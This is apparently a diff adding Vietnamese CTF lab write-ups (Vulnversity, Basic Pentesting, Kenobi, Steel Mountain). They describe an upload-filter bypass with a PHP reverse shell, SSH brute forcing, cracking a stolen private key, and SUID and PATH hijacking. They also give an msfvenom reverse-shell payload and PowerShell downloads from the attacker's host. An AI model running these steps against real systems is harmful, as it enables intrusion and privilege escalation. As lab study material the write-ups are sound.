@@ -66,3 +66,46 @@ Upload it here and we'll add it to the slides!`. Dự đoán ảnh upload sẽ �
 - Sau khi thực thi file ../content/LIP.jpg, ngay lập tức port 4444 tại local nhận được kết nối từ server để thực hiện shell. Tìm đến ../flag.txt để nhận flag.
 - Lưu ý tên các file trên server là ngẫu nhiên.
 - Happy Hacking!
+
+## Basic Computer Exploitation
+### Vulnversity
+- Recon: Nmap
+- Enum web-dir: gobuster
+- Tìm được thư mục upload, trang upload file. Tại form upload, bị block định dạng `.php`. Xem page source xác định không có client-side filter, block do server-side. Thử 1 vài định dạng khác của php (có thể dùng burp suite intruder để brute force), phát hiện định dạng `.phtml` có thể bypass. Upload payload  reverse shell php -> RCE -> gain access.
+- Tìm được flag 1 trong /home/bill/user.txt.
+- PrivEsc: dùng LinEnum.sh để enum -> tìm thấy SUID file có thể khai thác: `/bin/systemctl`. Khai thác theo GTFOBins không thành công, khai thác theo [PrivEsc: Systemctl](https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740) thành công -> gain root privilege. Lấy flag tại /root/root.txt.
+- Happy Hacking!
+
+### Basic Pentesting
+- Recon: nmap
+- Enum web-dir: gobuster
+- Enum SMB: enum4linux -> nhận được 2 username: jan; kay.
+- Brute force ssh jan: hydra
+- Gain access -> lấy id_rsa của kay trong /home/kay/.ssh/id_rsa
+- Dùng john để crack passphrase: `ssh2john id_rsa > file.txt`; `john --wordlists=/usr/share/wordlists/rockyou.txt file.txt`.
+- Có được passphrase -> ssh vào kay.
+- Trong /home/kay/pass.bak có chứa password của kay. Dùng nó để lấy quyền sudo. -> Privesc!
+- Happy Hacking!
+
+### Kenobi
+- Recon: Nmap -> chạy Samba và ProFTPD, ssh, rpcbind.
+- Enum Samba shares bằng Nmap NSE -> có 1 share: /anonymous, truy cập bằng smbclient, tải về tệp log.txt chứa thông tin về thông tin khi ssh key-gen và thông tin version ProFPTD bằng smbget. Tiếp tục dùng Nmap NSE để scan port rpcbind để showmount trên server: `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP`.
+- ProFPTD có CVE. Exploit theo CVE đó. Mount local machine với target. Truy cập vào FTP, exploit theo CVE, copy file id_rsa (theo đường dẫn lấy được trong log.txt) về local machine. SSH vào target theo user kenobi (có được từ log.txt) và id_rsa.
+- Privesc: tìm SUID binary: `find / -type f -perm -u=s 2>/dev/null`. Phát hiện file /usr/bin/menu có vẻ lạ lạ. Chạy /usr/bin/menu, hiện ra 3 lựa chọn "status check; kernel version; ifconfig" và cho phép nhập số để chọn 1 trong 3. Dùng `strings /usr/bin/menu` để list ra các string có thể đọc được. Trong đó có 3 dòng cần chú ý 
+![enter image description here](https://i.imgur.com/toHFALv.png)
+Đây là các lệnh chạy tương ứng với 3 options "status check; kernel version; ifconfig". Nhận thấy các lệnh này được gọi không phải bằng đường dẫn tuyệt đối (/usr/bin/curl thay vì curl, tương tự với 2 lệnh kia), ta có thể khai thác để Privesc với Path Variable Manipulation. Tạo file có tên curl trong /tmp với nội dung /bin/sh `touch /tmp/curl; echo "/bin/sh > /tmp/curl"`. Thay  đổi mode của file vừa tạo `chmod 777 /tmp/curl` (hoặc `chmod +x /tmp/curl`). Thay đổi biến người dùng PATH, trỏ đến /tmp để khi dùng curl, linux sẽ tìm đến /tmp và chạy /tmp/curl thay vì /usr/bin/curl (mạo danh curl thật) `export PATH=/tmp:$PATH`. Chạy lại /usr/bin/menu và chọn options 1, ta sẽ nhận được 1 root shell. Privesc thành công.
+- Happy Hacking!
+
+### Steel Mountain
+- Recon: Nmap.
+- Để ý có port 8080 chạy HTTP proxy. Truy cập vào thì thấy 1 trang quản lý file, sử dụng Rejetto HTTP File Server (Có CVE). Dùng metasploit exploit theo lỗ hổng đó -> gain initial access.
+- Privesc: 
+	* Để enum, ta sẽ sử dụng tập lệnh powershell có tên là PowerUp, mục đích là để đánh giá máy Windows và xác định bất kỳ sự bất thường nào - "_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations._". [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
+	* Download PowerUp từ Github về local, upload lên target thông qua meterpreter: `upload <path-to-file-local>`. Load powershell vào meterpreter: `load powershell`. Chạy powershell từ meterpreter: `powershell_shell`. Thực thi PowerUp.ps1: `. .\PowerUp.ps1` và chạy Invoke-AllChecks để enum: `Invoke-Allhecks`.
+	* Chú ý đến tùy chọn CanRestart được đặt thành true. Tên của service hiển thị dưới dạng lỗ hổng unquoted service path là AdvancedSystemCareService9. Tùy chọn CanRestart là true, cho phép ta khởi động lại một dịch vụ trên hệ thống, thư mục của ứng dụng cũng có thể ghi được. Điều này có nghĩa là chúng ta có thể thay thế ứng dụng gốc bằng ứng dụng độc hại của ta, khởi động lại service, service này sẽ chạy chương trình độc hại mà ta thay thế! 
+	* Chạy `get-service` để xem các service. Chú ý đến service AdvancedSystemCareService9 ở trạng thái running. Ta cần stop service đó trước khi upload ứng dụng độc hại lên để thay thế. Chạy `Stop-Service -Name "Advanced SystemCare Service 9"` để stop service đó.Use msfvenom to generate a reverse shell as an Windows executable: `msfvenom -p windows/shell_reverse_tcp LHOST=<Local-IP> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe` (tên output phải giống với tên ứng dụng được chạy bởi service). Thoát khởi powershell, quay lại meterpreter, dùng cd để chuyển đến path chạy service: C:\Program Files (x86)\IObit\Advanced SystemCare. Upload lên target qua meterpreter: `upload <path-to-ASCService-local>`. Mở listener ở local port 4443: `nc -lnvp 4443`. Quay trở lại powershell, start service để chạy ứng dụng độc hại vừa upload: `Start-Service -Name "Advanced SystemCare Service 9"`. Lúc này ở port 4443 local sẽ nhận được 1 root shell. Privesc!
+	* Final flag ở C:\Users\Administrator\Desktop\root.txt.
+- Access and Escalation without Metasploit:
+	* Searchsploit và exploit theo CVE. Để gain access cần 2 bước. Bước 1 download netcat binary, đồng thời dùng python mở 1 web server từ local tại nơi chứa netcat binary. Đồng thời chỉnh sửa IP và port trong file exploit thành IP local và port của http server local. Run exploit để đưa netcat binary vào target. Bước 2 chỉnh sửa port trong file exploit thành port reverse shell (ví dụ 4444). Đồng thời mở listener port tại local (ví dụ 4444). Run exploit để nhận được reverse shell. -> gain initial access.
+	* Privesc: Download WinPEAS.exe về local, mở http server. Tại target, chạy `powershell -c "wget http://<Local-IP>:<Local-HTTP-Port>/winPEASx86_ofs.exe -OutFile C:\Users\bill\Desktop\WinPEAS.exe"` để đưa WinPEAS đến target. Dùng cd đến `C:\Users\bill\Desktop` và chạy WinPEAS bằng `powershell -c ". .\WinPEAS.exe"`. Sau khi Enum thành công, chú ý đến khu vực `Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths`. Ở đó có service AdvancedSystemCareService9 có lỗ hổng unquoted path. Khai thác giống như cách dùng metasploit (lưu ý chạy command theo format `powershell -c "command here"` để chạy trên powershelll). Ở bước upload ASCService.exe, ta dùng python http server ở local và wget ở target (thay vì upload như metasploit). Các bước còn lại chạy tương tự như cách dùng metasploit. -> Privesc!
+- Happy Hacking!
